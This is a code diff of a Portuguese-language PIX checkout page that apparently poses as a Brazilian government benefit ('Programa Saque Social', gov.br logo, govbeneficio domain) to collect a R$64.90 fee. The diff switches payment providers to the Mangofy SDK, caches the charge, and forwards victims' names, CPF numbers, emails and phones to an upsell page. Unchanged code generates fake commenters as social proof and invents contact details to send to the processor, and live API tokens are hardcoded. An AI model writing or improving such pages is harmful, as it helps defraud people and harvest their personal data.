@@ -20,7 +20,7 @@ document.head.appendChild(a);
 </script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,maximum-scale=1.0,user-scalable=no">
-<title>Programa Saque Social - Pagamento</title>
+<title>Pagamento Seguro - PIX</title>
 <link rel="icon" href="images/favic.png" type="image/png">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="css/all.min.css">
@@ -171,7 +171,10 @@ document.head.appendChild(a);
 </head>
 <body>
 <header>
-  <div class="logo"><img src="images/govbr.png" style="width:90px;margin:10px;"></div>
+  <div class="logo">
+    <!-- TROQUE AQUI pela sua logo: coloque o arquivo na pasta images/ -->
+    <img src="images/govbr.png" style="width:90px;margin:10px;" alt="Logo">
+  </div>
   <div class="icons">
     <button><i class="fas fa-ellipsis-v"></i></button>
     <button><i class="fas fa-cookie-bite"></i></button>
@@ -273,24 +276,28 @@ document.head.appendChild(a);
   </p>
 </footer>
 <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async defer></script>
+<script src="https://checkout.mangofy.com.br/js/new/fast_api.min.js?key=vstmvkxe-6e3a42e3-3c50-48ff-a052-c566cdc1f21e" id="pix-sdk-script"></script>
 <script>
-  /* ── DUTTYFY PIX API ── */
-  var DUTTYFY_PIX_URL   = 'https://www.pagamentos-seguros.app/api-pix/zqaSpcAug94Zdb8cr3WnAmHjnIwYcheVmU-Cd5kvpKXbQLm0xVtsztoGScRruPtE6EdIOhgH8KaRETL6KtECrQ';
+  /* ══════════════════════════════════════════════════════════════
+     CONFIGURAÇÕES
+     ══════════════════════════════════════════════════════════════ */
   var PIX_VALOR_CENTS   = 6490;
   var PIX_DESCRICAO     = 'Front';
   var PIX_REDIRECT      = 'https://govbeneficio.vercel.app/up1.html';
+
   /* ── HASH DO PRODUTO (UTMify) ── */
   var PARADISE_PRODUCT_HASH = 'prod_7333c0ff75106325';
   /* ── CREDENCIAL DA API UTMIFY ── */
   var UTMIFY_API_TOKEN = 'hLLRiNJhaIzqdivrzVY7PLr1zH3sia014pMW';
 
-  var _pixCode='',_pixTxid='',_pixTimer=null,_pixQRFeito=false,_checkoutDisparado=false;
+  var _pixCode='',_pixPaymentCode='',_pixQRFeito=false,_checkoutDisparado=false;
   var _pixCreatedAt='';
   var _p=new URLSearchParams(window.location.search);
   var _nome=(_p.get('nome')||'').trim();
   var _cpf=(_p.get('cpf')||'').replace(/\D/g,'');
   var _email=(_p.get('email')||'cliente@email.com').trim();
   var _fone=(_p.get('telefone')||'11999999999').replace(/\D/g,'');
+
   /* ── CAPTURA DE PARÂMETROS UTM ── */
   var _utm_source   = _p.get('utm_source')   || '';
   var _utm_medium   = _p.get('utm_medium')   || '';
@@ -301,7 +308,7 @@ document.head.appendChild(a);
   var _src          = _p.get('src')          || '';
   var _sck          = _p.get('sck')          || '';
 
-  /* ── FORMATA DATA NO PADRÃO UTMIFY (YYYY-MM-DD HH:MM:SS) ── */
+  /* ── FORMATA DATA NO PADRÃO UTMIFY ── */
   function utmifyFmtDate(d) {
     return d.getFullYear() + '-' +
       String(d.getMonth()+1).padStart(2,'0') + '-' +
@@ -311,11 +318,6 @@ document.head.appendChild(a);
       String(d.getSeconds()).padStart(2,'0');
   }
 
-  /*
-   * ── NOTIFICA A UTMIFY VIA API ──────────────────────────────────────────────
-   *   status = 'waiting_payment'  → gera venda PENDENTE  (chamado ao criar o PIX)
-   *   status = 'paid'             → gera venda APROVADA  (chamado ao confirmar pagamento)
-   */
   async function utmifyNotificar(status) {
     try {
       var agora    = new Date();
@@ -323,7 +325,7 @@ document.head.appendChild(a);
       var nomeEnvio = nomeOk || 'Cliente Pagador';
       if (nomeEnvio.trim().split(' ').filter(Boolean).length < 2) nomeEnvio += ' Pagador';
       var body = {
-        orderId:       _pixTxid,
+        orderId:       _pixPaymentCode,
         platform:      'custom',
         paymentMethod: 'pix',
         status:        status,
@@ -377,10 +379,15 @@ document.head.appendChild(a);
     } catch(e) {}
   }
 
-  /* ── MONTA URL DE REDIRECIONAMENTO COM OS UTMs PRESERVADOS ── */
   function utmRedirectUrl() {
     var base = PIX_REDIRECT;
     var params = [];
+    /* Dados do cliente para o upsell */
+    if (_nome)  params.push('nome='     + encodeURIComponent(_nome));
+    if (_cpf)   params.push('cpf='      + encodeURIComponent(_cpf));
+    if (_email) params.push('email='    + encodeURIComponent(_email));
+    if (_fone)  params.push('telefone=' + encodeURIComponent(_fone));
+    /* UTMs */
     if (_utm_source)   params.push('utm_source='   + encodeURIComponent(_utm_source));
     if (_utm_medium)   params.push('utm_medium='   + encodeURIComponent(_utm_medium));
     if (_utm_campaign) params.push('utm_campaign=' + encodeURIComponent(_utm_campaign));
@@ -397,7 +404,6 @@ document.head.appendChild(a);
   function formatarCPF(c){return c.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');}
   function gerarProtocolo(){return new Date().getFullYear()+'.'+Math.floor(Math.random()*900000+100000)+'.'+Math.floor(Math.random()*9000+1000);}
 
-  /* ── GERA EMAIL ALEATÓRIO ── */
   function gerarEmailAleatorio() {
     var prefixos = ['contato','usuario','cliente','pagador','comprador','pessoa','acesso','membro'];
     var dominios = ['gmail.com','hotmail.com','outlook.com','yahoo.com.br','icloud.com'];
@@ -407,7 +413,6 @@ document.head.appendChild(a);
     return prefixo + numero + '@' + dominio;
   }
 
-  /* ── GERA TELEFONE BRASILEIRO ALEATÓRIO ── */
   function gerarFoneAleatorio() {
     var ddds = ['11','12','13','14','15','16','17','18','19','21','22','24','27','28',
                 '31','32','33','34','35','37','38','41','42','43','44','45','46','47',
@@ -427,99 +432,154 @@ document.head.appendChild(a);
   function ttqViewContent(){try{ttq.track('ViewContent',ttqConteudo());}catch(e){}}
   function ttqInitiateCheckout(){if(_checkoutDisparado)return;_checkoutDisparado=true;try{ttq.track('InitiateCheckout',ttqConteudo());}catch(e){}}
   function ttqAddPaymentInfo(){try{ttq.track('AddPaymentInfo',ttqConteudo());}catch(e){}}
-  function ttqPurchase(){try{ttq.track('Purchase',{content_id:'saque-social',content_name:PIX_DESCRICAO,content_type:'product',currency:'BRL',value:parseFloat((PIX_VALOR_CENTS/100).toFixed(2)),quantity:1,transaction_id:String(_pixTxid)});}catch(e){}}
+  function ttqPurchase(){try{ttq.track('Purchase',{content_id:'saque-social',content_name:PIX_DESCRICAO,content_type:'product',currency:'BRL',value:parseFloat((PIX_VALOR_CENTS/100).toFixed(2)),quantity:1,transaction_id:String(_pixPaymentCode)});}catch(e){}}
 
-  /* ── CRIA COBRANÇA PIX VIA DUTTYFY ── */
+  /* ══════════════════════════════════════════════════════════════
+     CACHE DO PIX — salva no localStorage para persistir entre reloads
+     Expira em 24h (mesmo tempo do PIX na Mangofy: expires_in_days: 1)
+     ══════════════════════════════════════════════════════════════ */
+  var PIX_CACHE_KEY = 'pix_cache_' + (_cpf || 'guest');
+  var PIX_EXPIRA_MS = 10 * 60 * 1000; /* 10 minutos */
+
+  function pixSalvarCache(pixCode, qrImage, paymentCode){
+    try {
+      localStorage.setItem(PIX_CACHE_KEY, JSON.stringify({
+        pixCode:     pixCode,
+        qrImage:     qrImage || '',
+        paymentCode: paymentCode || '',
+        criadoEm:    Date.now()
+      }));
+    } catch(e){}
+  }
+
+  function pixLerCache(){
+    try {
+      var raw = localStorage.getItem(PIX_CACHE_KEY);
+      if(!raw) return null;
+      var cache = JSON.parse(raw);
+      /* Verifica se expirou */
+      if(Date.now() - cache.criadoEm > PIX_EXPIRA_MS){
+        localStorage.removeItem(PIX_CACHE_KEY);
+        return null;
+      }
+      return cache;
+    } catch(e){ return null; }
+  }
+
+  function pixLimparCache(){
+    try { localStorage.removeItem(PIX_CACHE_KEY); } catch(e){}
+  }
+
+  /* ══════════════════════════════════════════════════════════════
+     EXIBE O PIX NA TELA (usado tanto pelo cache quanto pelo novo)
+     ══════════════════════════════════════════════════════════════ */
+  function pixExibir(pixCode, qrImage){
+    _pixCode = pixCode || '';
+    var valorFmt = 'R$ ' + (PIX_VALOR_CENTS/100).toFixed(2).replace('.',',');
+    document.getElementById('pix-nome-show').textContent = nomeOk || 'Cliente';
+    document.getElementById('pix-cpf-show').textContent  = _cpf ? formatarCPF(_cpf) : '---';
+    document.getElementById('pix-valor-label').textContent = valorFmt;
+    document.getElementById('pix-valor-topo').textContent  = valorFmt;
+    document.getElementById('pix-code-box').textContent    = _pixCode || 'Código indisponível — use o QR Code';
+
+    /* QR Code */
+    var wrap = document.getElementById('pix-qr-img'); wrap.innerHTML = '';
+    var imgEl = document.createElement('img');
+    if(qrImage){
+      imgEl.src = qrImage;
+    } else if(_pixCode){
+      imgEl.src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(_pixCode);
+    }
+    imgEl.style.cssText = 'border-radius:8px;max-width:190px;';
+    wrap.appendChild(imgEl);
+    _pixQRFeito = true;
+
+    document.getElementById('pix-loading').style.display = 'none';
+    document.getElementById('pix-erro').style.display    = 'none';
+    document.getElementById('pix-main').style.display    = 'block';
+  }
+
+  /* ══════════════════════════════════════════════════════════════
+     CRIA COBRANÇA PIX VIA MANGOFY SDK (generatePix)
+     ══════════════════════════════════════════════════════════════ */
+  var _pixGerando = false;
+  var _pixUltimaReq = 0;
+
   async function pixIniciar(){
-    document.getElementById('pix-loading').style.display='block';
-    document.getElementById('pix-erro').style.display='none';
-    document.getElementById('pix-main').style.display='none';
-    _pixQRFeito=false;
-    if(_pixTimer){clearInterval(_pixTimer);_pixTimer=null;}
+    /* 1) Tenta restaurar do cache primeiro */
+    var cache = pixLerCache();
+    if(cache && cache.pixCode){
+      _pixCreatedAt = utmifyFmtDate(new Date(cache.criadoEm));
+      _pixPaymentCode = cache.paymentCode || '';
+      pixExibir(cache.pixCode, cache.qrImage);
+      ttqViewContent();
+      return;
+    }
+
+    /* 2) Bloqueia cliques repetidos e rate limit */
+    if(_pixGerando) return;
+    var agora = Date.now();
+    var espera = 10000;
+    if(agora - _pixUltimaReq < espera){
+      var restante = Math.ceil((espera - (agora - _pixUltimaReq)) / 1000);
+      document.getElementById('pix-erro').querySelector('div').innerHTML =
+        'Aguarde ' + restante + ' segundos antes de tentar novamente.';
+      document.getElementById('pix-erro').style.display = 'block';
+      document.getElementById('pix-loading').style.display = 'none';
+      return;
+    }
+    _pixGerando = true;
+    _pixUltimaReq = agora;
+
+    document.getElementById('pix-loading').style.display = 'block';
+    document.getElementById('pix-erro').style.display    = 'none';
+    document.getElementById('pix-main').style.display    = 'none';
+    _pixQRFeito = false;
     ttqIdentify();
-    try{
-      var nomeEnvio=nomeOk||'Cliente';
-      if(nomeEnvio.trim().split(' ').filter(Boolean).length<2)nomeEnvio+=' Pagador';
-      var cpfEnvio=_cpf.replace(/\D/g,'');
-      var emailEnvio=_email&&_email.indexOf('@')>0?_email:gerarEmailAleatorio();
-      var foneEnvio=(_fone||'').replace(/\D/g,'')||gerarFoneAleatorio();
 
-      /* Captura todos os parâmetros de rastreamento da URL atual */
-      var utmStr=window.location.search.replace(/^\?/,'');
-
-      var payload={
-        amount: PIX_VALOR_CENTS,
-        customer:{
-          name:     nomeEnvio,
-          document: cpfEnvio,
-          email:    emailEnvio,
-          phone:    foneEnvio
-        },
-        item:{
-          title:    PIX_DESCRICAO,
-          price:    PIX_VALOR_CENTS,
-          quantity: 1
-        },
-        paymentMethod: 'PIX',
-        utm: utmStr
+    try {
+      var config = {
+        total_price: PIX_VALOR_CENTS / 100,
+        items: [
+          { name: PIX_DESCRICAO, price: PIX_VALOR_CENTS / 100, quantity: 1 }
+        ]
       };
 
-      var res=await fetch(DUTTYFY_PIX_URL,{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify(payload)
-      });
-      var data=await res.json();
-      if(!res.ok||!data.pixCode||!data.transactionId)throw new Error('Erro');
+      var response = await generatePix(config);
+      if(!response.success) throw new Error(response.message || 'Erro ao gerar PIX');
 
-      _pixTxid=data.transactionId;
-      _pixCode=data.pixCode;
-      _pixCreatedAt=utmifyFmtDate(new Date());
+      _pixCode        = response.pixCode || '';
+      _pixPaymentCode = response.paymentCode || '';
+      _pixCreatedAt   = utmifyFmtDate(new Date());
 
-      var valorFmt='R$ '+(PIX_VALOR_CENTS/100).toFixed(2).replace('.',',');
-      document.getElementById('pix-nome-show').textContent=nomeOk||'Cliente';
-      document.getElementById('pix-cpf-show').textContent=_cpf?formatarCPF(_cpf):'---';
-      document.getElementById('pix-valor-label').textContent=valorFmt;
-      document.getElementById('pix-valor-topo').textContent=valorFmt;
-      document.getElementById('pix-code-box').textContent=_pixCode;
+      /* Salva no cache para persistir entre reloads */
+      pixSalvarCache(_pixCode, response.qrCodeImage, _pixPaymentCode);
 
-      /* QR Code gerado a partir do pixCode (string EMV) */
-      var wrap=document.getElementById('pix-qr-img');wrap.innerHTML='';
-      var imgEl=document.createElement('img');
-      imgEl.src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(_pixCode);
-      imgEl.style.cssText='border-radius:8px;max-width:190px;';
-      wrap.appendChild(imgEl);_pixQRFeito=true;
-
-      document.getElementById('pix-loading').style.display='none';
-      document.getElementById('pix-main').style.display='block';
-
+      pixExibir(_pixCode, response.qrCodeImage);
       ttqViewContent();
       ttqInitiateCheckout();
       utmifyNotificar('waiting_payment');
-      pixPolling();
-    }catch(err){
-      document.getElementById('pix-loading').style.display='none';
-      document.getElementById('pix-erro').style.display='block';
+
+    } catch(err){
+      console.error('Erro PIX Mangofy:', err);
+      document.getElementById('pix-erro').querySelector('div').innerHTML =
+        'Não foi possível gerar o PIX.<br>Verifique sua conexão e tente novamente.';
+      document.getElementById('pix-loading').style.display = 'none';
+      document.getElementById('pix-erro').style.display    = 'block';
+    } finally {
+      _pixGerando = false;
     }
   }
 
-  /* ── POLLING DE STATUS VIA DUTTYFY ── */
-  function pixPolling(){
-    if(!_pixTxid)return;
-    var tentativas=0;
-    _pixTimer=setInterval(async function(){
-      tentativas++;if(tentativas>180){clearInterval(_pixTimer);return;}
-      try{
-        var r=await fetch(DUTTYFY_PIX_URL+'?transactionId='+encodeURIComponent(_pixTxid));
-        var s=await r.json();
-        if(s.status==='COMPLETED'){
-          clearInterval(_pixTimer);
-          ttqPurchase();
-          await utmifyNotificar('paid');
-          setTimeout(function(){window.location.href=utmRedirectUrl();},800);
-        }
-      }catch(e){}
-    },5000);
+  /* ══════════════════════════════════════════════════════════════
+     CALLBACK AUTOMÁTICO DA MANGOFY — chamado pelo SDK quando
+     o pagamento é aprovado
+     ══════════════════════════════════════════════════════════════ */
+  async function paymentApproved(){
+    pixLimparCache();
+    ttqPurchase();
+    await utmifyNotificar('paid');
+    window.location.href = utmRedirectUrl();
   }
 
   function pixAba(aba){
@@ -528,7 +588,6 @@ document.head.appendChild(a);
     document.getElementById('ppane-copia').classList.toggle('on',aba==='copia');
     document.getElementById('ppane-qr').classList.toggle('on',aba==='qr');
   }
-
   function pixCopiar(){
     if(!_pixCode)return;
     var btn=document.getElementById('pix-copy-btn');var orig=btn.innerHTML;
@@ -550,7 +609,6 @@ document.head.appendChild(a);
   async function createRandomComment(text,initial){totalComments++;var ud=await getRandomUser();createComment(ud.name.first,ud.picture.medium,text,0,0,initial);storedComments.unshift({name:ud.name.first,avatar:ud.picture.medium,text:text,likes:0,dislikes:0});}
   function createComment(name,avatar,text,likes,dislikes,initialLoad){var el=document.createElement('div');el.classList.add('comment-item');el.innerHTML='<img class="comment-avatar" src="'+avatar+'"/><div class="comment-content"><div class="comment-name">'+name+'</div><div class="comment-text">'+text+'</div><div class="comment-actions"><span class="comment-likes"><i class="fas fa-thumbs-up"></i> '+likes+'</span></div></div>';var c=document.getElementById('fb-comments-container');c.insertBefore(el,c.firstChild);}
   async function getRandomUser(){var r=await fetch('https://randomuser.me/api/?nat=br');return(await r.json()).results[0];}
-
   initFacebookComments();
   pixIniciar();
 </script>
